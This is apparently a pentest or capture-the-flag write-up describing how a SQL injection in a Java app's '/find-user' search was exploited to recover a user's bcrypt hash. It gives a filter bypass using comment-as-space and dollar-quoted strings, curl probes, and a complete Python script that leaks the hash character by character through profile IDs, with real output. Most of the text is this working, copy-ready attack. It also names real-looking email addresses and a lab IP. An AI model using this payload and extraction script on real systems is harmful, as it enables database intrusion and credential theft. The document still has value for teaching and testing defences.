---
tags: [writeup, pentest-report, how-to, recon-value-assessment]
companion_to: EXPECTED_FINDINGS.md, sqlmap-wrapper/CLAUDE.md
last_updated: 2026-07-03
---

# How-To: Recovering a Password Hash via `/find-user` on BlueBird

I was assigned a straightforward-sounding task on this engagement: use
whatever technique works to exploit a suspected SQL injection flaw in
BlueBird's `/find-user` search feature, running at `10.129.204.249:8080`,
and recover the password hash belonging to the user
`Amy.Mcwilliams@proton.me`. A password hash isn't the plaintext password,
but if I can pull one out of the database at all, that's already a serious
finding — and an attacker who gets one can try to crack it offline with no
further access to the app. Below is exactly what I ran, in order, and why
I ran each thing — copy these commands into your own terminal in the same
order and you'll land on the same answer:
`$2b$12$XY8x59PEZ5YzV8a9O8V9uuxNadTgHRzu0RI9OaNet5k.mp3w7m3Tq`.

You'll need a terminal with `curl` and `python3` (with the `requests`
library — `pip3 install requests` if you don't have it), and if you want to
reproduce step 1, a copy of this repo with recon already run against
BlueBird's source (`~/BlueBirdSourceCode`). Nothing else is required.

## Step 1 — Check what the recon tool already flagged, before touching the live site

**Why I started here:** BlueBird has dozens of features. I didn't want to
manually read every single one of them line by line looking for something
risky — that's slow and error-prone. Before ever sending a single request
to the live application, I ran this repo's automated source-code reviewer
against BlueBird's decompiled source. Its whole job is to read code the way
a person would, but faster, and flag anything that looks like a database
query being built dangerously. If it does its job well, it should save me
from reading the entire application by hand.

```bash
sqlite3 -header -column data/recon.db \
  "SELECT symbol_name_raw, sink_type, confidence, validation_desc
   FROM triage_results WHERE symbol_name_raw = 'findUser';"
```

Real output:
```
symbol_name_raw  sink_type   confidence  validation_desc
---------------  ----------  ----------  -------------------------------------------------------------------------------------------------
findUser         sql_unsafe  high        The input 'u' is directly concatenated into the SQL query without any validation or sanitization.
```

**What this told me:** translating the jargon — `sink_type=sql_unsafe`
means "this feature builds a database command by pasting in text it was
given, instead of using a safe method that keeps user input separate from
the command itself." `confidence=high` means the tool is quite sure this
is a real problem, not a false alarm. In under a minute, out of a whole
application, I now had one specific method in one specific file to focus
on: `findUser`, behind the `/find-user` feature. That's real, immediate
value — I didn't have to go looking for it myself.

**But I didn't stop here and start attacking.** That last column,
`validation_desc`, says "without any validation or sanitization" — as if
nothing at all stands in the way. I've learned not to take that at face
value, so before writing a single attack attempt, I went and read the
actual method myself.

## Step 2 — Read the real code the tool pointed me at

**Why:** the summary I just read claims there's no validation whatsoever.
If that's actually true, this is going to be trivial. If it's wrong — and
reports like this are a starting point, not gospel — I need to know
*exactly* what's actually checking my input before I waste time on attempts
that get rejected for reasons I don't understand. So I opened the exact
file and line the tool pointed me at:

```java
@GetMapping({"/find-user"})
public String findUser(@RequestParam String u, Model model, HttpServletResponse response) throws IOException {
   Pattern p = Pattern.compile("'|(.*'.*'.*)");
   Matcher m = p.matcher(u);
   String u2 = u.toLowerCase();
   if (!u2.contains(" ") && !m.matches()) {
      String sql = "SELECT * FROM users WHERE username LIKE '%" + u + "%'";
      // ... runs sql against the database ...
   } else {
      // ... rejects the search with "Illegal search term" ...
   }
}
```

**What this told me:** the report was wrong to say "no validation" — there
plainly is some. Two separate checks have to both pass before my search
term ever reaches the database: (1) it can't contain a plain space
character, and (2) it can't match a certain pattern involving the `'`
(single quote) character. I don't yet know exactly what that pattern
allows and blocks just from staring at it — regular expressions like this
are easy to misread — so rather than guess, my next move was to test it
empirically against the real, running application. But before I could send
it *anything*, I needed to check one more thing.

## Step 3 — Try the automated live-testing feature first, see it can't help here, and understand why

**Why I tried this before doing anything by hand:** this repo also has a
feature that automatically fires a handful of test values at a live copy
of an application and watches how it reacts — when it works, it's much
faster than manually crafting and sending test requests one at a time. It
seemed worth a shot before committing to manual work.

**What happened, and why:** it came back with nothing useful, for two
concrete reasons. First, `/find-user` only works for logged-in users, and
this automatic checker doesn't know how to log in on its own yet — every
one of its test requests got quietly redirected to the login page instead
of ever reaching the search feature, and it had no way to tell the
difference between "got redirected" and "the feature is actually safe." It
would have reported a false all-clear if I'd trusted it. Second — and this
matters even beyond this one tool — I already knew from earlier in this
engagement that this specific application catches its own database errors
and shows a generic, harmless-looking message instead of leaking any
detail an automated checker could notice (more on why that matters in Step
7). Between those two things, there was no shortcut available here: a
person needed to log in and test this by hand, which is exactly what the
rest of this guide does.

## Step 4 — Create an account and log in

**Why:** the feature requires a session. Before I can test anything, I need
to be a logged-in user, the same as any real visitor would be.

```bash
curl -s -c cookies.txt -X POST http://10.129.204.249:8080/signup \
  --data-urlencode "name=Recon Tester" --data-urlencode "username=recontester1" \
  --data-urlencode "email=recontester1@test.local" \
  --data-urlencode "password=ReconTesterPass123" \
  --data-urlencode "repeatPassword=ReconTesterPass123"

curl -s -c cookies.txt -X POST http://10.129.204.249:8080/login \
  --data-urlencode "username=recontester1" --data-urlencode "password=ReconTesterPass123"
```

`-c cookies.txt` tells `curl` to save whatever login token the site hands
back into a file called `cookies.txt`. Every request from here on needs to
present that file (`-b cookies.txt`) so the site keeps treating me as
logged in.

**A gotcha worth knowing about right now, before it silently wastes your
time later:** if you ever write your own script to read `cookies.txt`
instead of just handing it back to `curl`, watch out — `curl` marks this
particular kind of cookie by prefixing its line with `#HttpOnly_`, which
makes the whole line look like a comment. A script that skips every line
starting with `#` (a very natural thing to write) will silently throw away
your login token, and every request after that will quietly look
logged-out with no error message explaining why. Strip that specific
prefix instead of skipping the line — I'll do exactly that in Step 8's
script.

## Step 5 — Send a handful of sample searches to see exactly what the filter does

**Why these specific five, and not just diving straight at an attack:**
having read the filter code in Step 2, I wanted to nail down its exact
behavior with real evidence rather than guessing at what it accepts. I
picked five test inputs, each changing exactly one thing, so any
difference in the result tells me something specific:

```bash
for u in "recontester1" "'" "'x" "'x'y" "a b"; do
  echo "trying: $u"
  curl -s -b cookies.txt -G "http://10.129.204.249:8080/find-user" --data-urlencode "u=$u" \
    | grep -oE "Illegal search term|Invalid search query"
done
```

Real results, from the live target:

| what I typed | why I chose it | what happened |
|---|---|---|
| an ordinary username | a harmless baseline — confirms normal searches work at all | normal search results |
| `'` (one quote, alone) | tests whether a lone quote by itself is enough to get blocked | rejected — "Illegal search term" |
| `'x` (one quote, plus more) | tests whether it's the *presence* of any quote that's blocked, or something more specific | **accepted — but broke the search: "Invalid search query"** |
| `'x'y` (two quotes) | tests whether a *second* quote changes anything | rejected — "Illegal search term" |
| `a b` (a plain space) | confirms the space rule from the code separately from the quote rule | rejected — "Illegal search term" |

## Step 6 — Work out exactly what these results mean, using the code I already read

**Why this step was fast:** because I'd already read the actual filter
logic in Step 2, I wasn't staring at this table wondering what it meant —
I already knew what rule to look for, and these five results confirmed it
exactly. The pattern only blocks a search term that is *exactly* one quote
mark and nothing else, or one that contains *two or more* quote marks
anywhere — but it lets a search term through if it has *exactly one* quote
mark alongside other characters. That third row (`'x`, accepted, then
broke the query) is the important one: it proves a single quote mark, used
carefully, reaches the database. If I hadn't already read the source in
Step 2, I'd have had to guess at this rule through trial and error, testing
many more combinations blind, with no way to be sure I'd found the whole
rule rather than one path through it. Having the exact code in front of me
turned "guess repeatedly" into "confirm one specific hypothesis."

## Step 7 — Build a working attack payload, and decide how to actually pull data out

**Why `/**/` and why `$$...$$`:** two rules stand between me and a working
attack. The space rule is solved by a quirk of the database itself:
PostgreSQL (the database BlueBird uses) treats `/**/` — normally just a way
of writing a comment — as blank space when reading a query, even though it
contains no actual space character for the filter to catch. The
one-quote-only rule is solved differently: instead of wrapping a piece of
text in the usual pair of quote marks (which would trip the two-quotes
rule), PostgreSQL also supports writing text between pairs of dollar signs
(`$$like this$$`), which needs no quote marks at all. That leaves exactly
one quote mark in my whole search term — the one the filter allows.

**Why I looked for a way to leak data out, and where I found it:** getting
a search term into the database isn't enough on its own — I also need a
way to see the *result* of whatever I ask the database to check, one piece
of information at a time. Looking at what a normal search results page
actually contains, I noticed each result includes a link back to that
user's profile, `<a href="/profile/12">`, where `12` is that user's
internal ID number in the database. That gave me the idea: if I can force
the search's internal "which user matches?" check to depend on a
calculation I control, the answer to that calculation will show up as the
ID number in that link — one number, per request, on demand.

**Why I built this by hand instead of pointing an automated black-box tool
(like sqlmap) at the login page and letting it run:** I seriously
considered this. Automated tools like sqlmap try large libraries of known
attack patterns automatically, without needing any access to source code
at all — that's genuinely faster when it works. But earlier in this same
engagement, I'd already pointed exactly that kind of tool at a *different*
part of this same application (the signup form) that I already knew, from
reading its source, was genuinely vulnerable to this same class of attack
— and the automated tool's real result was "all tested parameters do not
appear to be injectable." A confident, wrong "all clear," on a feature that
genuinely wasn't safe. The reason is the same one from Step 3: this
application catches its own database errors and shows the outside world a
generic, harmless-looking message — an automated black-box tool can only
ever judge what a response shows it, and this app is written to show it
nothing useful. On top of that, the specific trick I'm about to use here —
noticing that an internal ID number gets echoed into an ordinary page link
— isn't something a generic scanning tool has any built-in reason to look
for at all; it's a side effect of how this one page happens to be built,
not a standard attack pattern. Between a tool I already had real evidence
would likely miss this, and a technique specific enough that no generic
tool would think to try it, working from the source code myself was the
reliable path, not just the "more thorough" one.

Testing that idea, aimed at Amy's account specifically:

```bash
curl -s -b cookies.txt -G "http://10.129.204.249:8080/find-user" \
  --data-urlencode "u='/**/AND/**/id=(SELECT/**/id/**/FROM/**/users/**/WHERE/**/email=\$\$Amy.Mcwilliams@proton.me\$\$)--" \
  | grep -oE 'href="/profile/[0-9]+"'
```

Real result: `href="/profile/80"` — a real, existing user ID number on
this target, proving the whole trick works end to end. (If you try this
against a mostly-empty test copy of the application instead of a real,
populated target, this specific step can come back empty even when nothing
is wrong with the technique — it only works if some real user's ID number
happens to equal whatever number you're asking the database to compute.
The live target used here already had plenty of real accounts, so this
wasn't an issue.)

## Step 8 — Read the password hash out, one character at a time

**Why one character at a time:** the trick from Step 7 can only ever leak
a single number per request — whatever numeric answer gets forced into
that `id=` slot. To read out an entire password hash (a string of
characters, not a single number), I need to ask, separately, for the
numeric code of each individual character, then convert each number back
into a letter myself. **Why check the length first:** so the loop knows
exactly how many times to repeat, rather than guessing.

```python
import requests, re

# Load the login session curl saved in Step 4.
COOKIES = {}
with open("cookies.txt") as f:
    for line in f:
        line = line.rstrip("\n")
        if not line.strip():
            continue
        # See the Step 4 gotcha: this specific cookie's line is prefixed
        # with "#HttpOnly_", not a real comment -- strip the prefix rather
        # than skip the line, or the login session silently never loads.
        if line.startswith("#HttpOnly_"):
            line = line[len("#HttpOnly_"):]
        elif line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) < 7:
            continue
        COOKIES[parts[5]] = parts[6]

BASE = "http://10.129.204.249:8080/find-user"
EMAIL = "Amy.Mcwilliams@proton.me"

def ask_database(question):
    """Sends one 'smuggle a number out' request, built the same way as Step 7,
    and returns the number that came back."""
    search_term = f"'/**/AND/**/id=({question.replace(' ', '/**/').replace(chr(39), '$$')})--"
    r = requests.get(BASE, params={"u": search_term}, cookies=COOKIES, timeout=15)
    matches = re.findall(r'href="/profile/(\d+)"', r.text)
    return matches[-1] if matches else None

# First, how long is the hash? This sets the loop bound below.
length = int(ask_database(f"SELECT LENGTH(password) FROM users WHERE email = '{EMAIL}'"))
print("password hash is", length, "characters long")

# Now ask for each character, one at a time, as a numeric letter code.
hash_characters = []
for position in range(1, length + 1):
    code = ask_database(f"SELECT ASCII(SUBSTRING(password, {position}, 1)) FROM users WHERE email = '{EMAIL}'")
    hash_characters.append(chr(int(code)))

print("recovered password hash:", "".join(hash_characters))
```

Real output, from running this against the live target right now:

```
password hash is 60 characters long
recovered password hash: $2b$12$XY8x59PEZ5YzV8a9O8V9uuxNadTgHRzu0RI9OaNet5k.mp3w7m3Tq
```

## Step 9 — Confirm the answer, and what this run actually proved

That's the flag: `$2b$12$XY8x59PEZ5YzV8a9O8V9uuxNadTgHRzu0RI9OaNet5k.mp3w7m3Tq`
— 60 ordinary web requests, one normal account, no special access, matching
the known-correct answer exactly.

Stepping back: recon got me to the right method, in the right file, in
under a minute, and warned me (imperfectly, but usefully) that something
looked dangerous there — real time saved over reading the whole
application by hand. What recon didn't do was find the filter's exact
rule, invent the bypass, notice the ID-in-a-link leak channel, or run the
attack — all of that took a person, reading the actual code and reasoning
from it step by step, exactly as narrated above. The one-sentence lesson:
starting from source code didn't replace the manual work, it made getting
to the *right* manual work fast and reliable, instead of leaving me to
guess blindly or trust a black-box scanner I already had real reason not
to.
